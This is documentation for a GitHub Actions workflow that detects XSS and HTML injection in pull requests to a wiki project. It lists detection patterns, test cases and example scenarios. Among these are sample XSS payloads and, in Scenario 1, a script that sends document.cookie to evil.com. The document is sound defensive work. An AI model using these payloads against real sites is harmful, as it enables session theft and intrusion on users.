# HTML Security Validation GitHub Workflow

## Overview

Automated GitHub Actions workflow that validates HTML content in pull requests to detect and prevent XSS and injection attacks.

## Files Created

1. **`.github/workflows/html-security-validation.yml`** - GitHub Actions workflow (parent project)
2. **`wiki-framework/scripts/validateHtml.js`** - Validation script with pattern detection (framework)
3. **`.github/workflows/html-security-validation.yml.md`** - Workflow documentation (parent project)
4. **Updated `wiki-framework/.github/labels.json`** - Added `security:warning` label

## How It Works

### Trigger
Runs on all pull requests when files change in:
- `public/content/**/*.md` (markdown content)
- `src/**/*.jsx` (React components)
- `src/**/*.js` (JavaScript files)

### Detection Patterns

**Critical Severity (❌ Blocks merge):**
- `<script>` tags
- Event handlers (`onclick`, `onerror`, `onload`, etc.)
- JavaScript URLs (`href="javascript:..."`)
- Data URIs with scripts
- SVG with embedded scripts

**High Severity (⚠️ Warning):**
- `<iframe>` tags
- `<object>` / `<embed>` tags
- `<base>` tag manipulation
- Data URIs with HTML

**Medium Severity:**
- `<form>` tags
- Meta refresh redirects
- CSS @import in style attributes

**Low Severity:**
- Suspicious class names (non-Tailwind patterns)

### Smart Filtering (False Positive Prevention)

The validator intelligently filters content to avoid flagging safe code examples and documentation:

**Markdown Files (.md):**
- Strips code blocks (``` ... ```) before scanning
- Prevents false positives from code examples in documentation
- Example: Code showing `onClick={}` in README won't trigger alert

**JavaScript Files (.js, .jsx, .ts, .tsx):**
- Strips JSDoc comments (/** ... */) before scanning
- Prevents false positives from type annotations
- Example: `@returns {Promise<Object>}` won't trigger object injection alert
- Skips event handler pattern matching (React props are not HTML attributes)
- Example: `onChange={handleChange}` in JSX is safe

### Workflow Steps

1. **Checkout** - Gets PR code and base branch
2. **Install** - Sets up Node.js and dependencies
3. **Scan** - Runs validation script on changed files
4. **Report** - Generates markdown report of findings
5. **Comment** - Posts/updates comment on PR with results
6. **Label** - Adds `security:warning` label if critical issues found
7. **Status** - Fails if critical issues detected

### PR Comment Example

```markdown
## 🚨 HTML Security Validation Results

**⚠️ CRITICAL SECURITY ISSUES DETECTED**

### Summary
| Severity | Count |
|----------|-------|
| 🔴 Critical | 2 |
| 🟠 High | 1 |
| 🟡 Medium | 0 |
| 🔵 Low | 0 |

### 🔴 Critical Severity Issues

**`public/content/guides/example.md:42`**
- Script tag detected - potential XSS attack
- Matched: `<script>`
- Context: `<script>alert('XSS')</script>`
```

### Label Management

**`security:warning`** label:
- **Color**: Red (#d73a4a)
- **Added when**: Critical or high severity issues detected
- **Removed when**: All issues resolved
- **Synced automatically**: Via label sync workflow

## Testing

### Local Testing

```bash
# Run validator locally
npm run validate:html

# Or directly from framework
node wiki-framework/scripts/validateHtml.js

# Test in PR context
GITHUB_BASE_REF=origin/main GITHUB_SHA=HEAD node wiki-framework/scripts/validateHtml.js
```

### Test Cases

**Should Detect (Critical):**
```html
<!-- ❌ Script injection -->
<script>alert('XSS')</script>

<!-- ❌ Event handler -->
<img src="x" onerror="alert('XSS')" />

<!-- ❌ JavaScript URL -->
<a href="javascript:alert('XSS')">Click</a>
```

**Should Allow (Safe):**
```html
<!-- ✅ Text color -->
<span class="text-red-500">Red text</span>

<!-- ✅ Image -->
<img src="/images/logo.png" alt="Logo" />

<!-- ✅ Alignment -->
<div align="center">Centered</div>
```

## Integration with Sanitization

This workflow provides **defense in depth**:

### Layer 1: GitHub Action (Pre-merge)
- Detects issues before code is merged
- Prevents malicious PRs from being merged
- Educates contributors about safe HTML

### Layer 2: rehype-sanitize (Runtime)
- Sanitizes HTML during rendering
- Blocks dangerous elements/attributes
- Always active, even if check bypassed

### Layer 3: Browser CSP (Defense)
- Content Security Policy headers
- Browser-level XSS protection
- Last line of defense

## Configuration

### Adding New Patterns

Edit `wiki-framework/scripts/validateHtml.js`:

```javascript
SECURITY_PATTERNS.myNewPattern = {
  pattern: /dangerous-pattern-here/gi,
  severity: 'critical', // critical | high | medium | low
  message: 'What this pattern does and why it is dangerous'
};
```

### Adjusting Severity

Change severity levels in pattern definitions in `wiki-framework/scripts/validateHtml.js`:
- **critical** - Blocks merge, adds label
- **high** - Warning, adds label
- **medium** - Warning only
- **low** - Informational

### Workflow Triggers

Modify `.github/workflows/html-security-validation.yml`:

```yaml
on:
  pull_request:
    types: [opened, synchronize, reopened]
    paths:
      - 'public/content/**/*.md'  # Add/remove paths
      - 'src/**/*.jsx'
```

## False Positives

### Handling Legitimate HTML

If safe HTML is flagged:

1. **Explain in PR comment** why the HTML is necessary
2. **Request review** from maintainer
3. **Consider alternatives**:
   - Use markdown syntax instead
   - Use toolbar features (color picker, image inserter)
   - Refactor to React component

### Maintainer Override

Maintainers can:
- Merge despite failing check
- Remove `security:warning` label manually
- Add pattern exceptions (not recommended)

**Important**: The sanitizer still protects even if check is overridden.

## Maintenance

### Regular Updates

- **Weekly**: Review flagged PRs
- **Monthly**: Update detection patterns
- **Quarterly**: Test with OWASP XSS payloads
- **Yearly**: Security audit

### Pattern Updates

When new XSS vectors are discovered:
1. Add pattern to `wiki-framework/scripts/validateHtml.js`
2. Test locally with `npm run validate:html`
3. Update documentation
4. Commit to framework submodule
5. Update parent project submodule reference

### Label Sync

Labels are automatically synced via:
- **Workflow**: `.github/workflows/sync-labels.yml`
- **Schedule**: Weekly (Sunday 00:00 UTC)
- **Manual**: Actions tab → Sync Labels → Run workflow

## Monitoring

### Check Workflow Results

- **PR page**: Check badge next to commit
- **Actions tab**: View detailed logs
- **PR comment**: See validation report

### Common Issues

**Workflow not running:**
- Check file paths match triggers
- Verify Actions enabled
- Check permissions

**Labels not added:**
- Verify label exists in repo
- Check workflow permissions
- Run label sync workflow

**False negatives:**
- Update patterns in validation script
- Test locally before committing
- Report pattern for addition

## Security Best Practices

### For Contributors

1. **Prefer markdown** over raw HTML
2. **Use toolbar features** for formatting
3. **Test in preview** before submitting
4. **Explain HTML usage** if flagged

### For Maintainers

1. **Review security warnings** carefully
2. **Never bypass without justification**
3. **Keep patterns updated**
4. **Monitor for new vectors**
5. **Audit periodically**

### For Developers

1. **Don't disable sanitizer** (`rehype-sanitize`)
2. **Don't use** `dangerouslySetInnerHTML`
3. **Test with malicious payloads** when adding features
4. **Keep dependencies updated**

## Performance Impact

- **Scan time**: ~500ms for typical PR
- **Comment time**: ~2-3s
- **Total overhead**: ~5-10s per PR

Negligible impact on PR workflow.

## Related Documentation

- **Security overview**: `wiki-framework/SECURITY.md`
- **Implementation**: `.claude/memory/HTML-INJECTION-SECURITY.md`
- **Workflow docs**: `.github/workflows/html-security-validation.yml.md`
- **CLAUDE.md**: Security section

## Example Scenarios

### Scenario 1: Malicious Script Injection

**PR changes**:
```markdown
Check out this cool feature!

<script>
  fetch('https://evil.com/steal-cookies?c=' + document.cookie);
</script>
```

**Workflow response**:
- ❌ Fails check
- 🏷️ Adds `security:warning` label
- 💬 Comments with critical severity finding
- 🚫 Blocks merge

### Scenario 2: Legitimate Image with Event

**PR changes**:
```html
<img src="/guide.png" onerror="this.src='/fallback.png'" />
```

**Workflow response**:
- ❌ Flags event handler
- 💬 Comments with issue
- 📝 Contributor explains fallback need
- 👥 Maintainer reviews
- ✅ Merged after review (sanitizer strips `onerror`)

### Scenario 3: Safe Text Color

**PR changes**:
```html
<span class="text-red-500">Important warning</span>
```

**Workflow response**:
- ✅ Passes all checks
- No comments added
- Merges normally

## Future Enhancements

Potential improvements:

- [ ] Add automated fix suggestions
- [ ] Integrate with OWASP ZAP
- [ ] Test against XSS payload database
- [ ] Add security score to PR
- [ ] Auto-fix safe patterns
- [ ] Machine learning detection
- [ ] Real-time validation in editor

**Status**: ✅ Implemented and Active
**Last Updated**: 2025-12-15
